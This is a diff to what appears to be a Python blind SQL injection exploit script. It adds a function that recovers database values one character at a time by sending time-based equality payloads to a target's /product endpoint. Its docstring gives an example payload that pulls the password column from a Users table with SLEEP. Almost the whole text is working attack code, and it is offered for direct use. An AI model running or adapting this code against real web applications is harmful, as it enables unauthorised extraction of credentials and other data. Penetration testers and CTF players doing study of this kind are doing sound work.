@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
-"""Blind SQL injection: time-based and boolean-based oracles, generic
-binary-search extraction (dump_value), and information_schema enumeration.
+"""SQL injection: time-based and boolean-based blind oracles, generic
+binary-search extraction (dump_value), information_schema enumeration, and
+a simple time-based character-equality probe.
 
 Switch DBMS by changing the DB constant below. Payload templates take a
 {cond} (a SQL condition) and {delay} (seconds)."""
 
+import string
 import time
 import requests
 
@@ -42,6 +44,27 @@ def is_true_boolean_based(condition_sql: str) -> bool:
     params = {"id": payload}
     r = SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=10)
     return TRUE_MARKER in r.text
+
+
+def extract_char_equality(select_query: str, pos: int, delay: int = DELAY,
+                          charset: str = string.printable) -> str:
+    """Recover a single character at position `pos` by brute-forcing each
+    candidate with a direct time-based equality probe, e.g.:
+
+        %' AND IF((SELECT SUBSTRING(password,1,1) FROM Users LIMIT 1)='a',SLEEP(5),0)-- -
+
+    Simpler but slower than dump_value's binary search (one request per
+    candidate instead of ~7 per character). Returns "" if no candidate matches."""
+    for ch in charset:
+        cond = f"(SELECT SUBSTRING(({select_query}),{pos},1))='{ch}'"
+        payload = TIME_PAYLOADS[DB].format(cond=cond, delay=delay)
+        params = {"id": payload}
+        start = time.time()
+        SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=delay + 10)
+        if time.time() - start >= delay:
+            print(f"[+] pos {pos}: {ch}")
+            return ch
+    return ""
 
 
 def dump_value(select_query: str, oracle, max_len: int = 64) -> str:
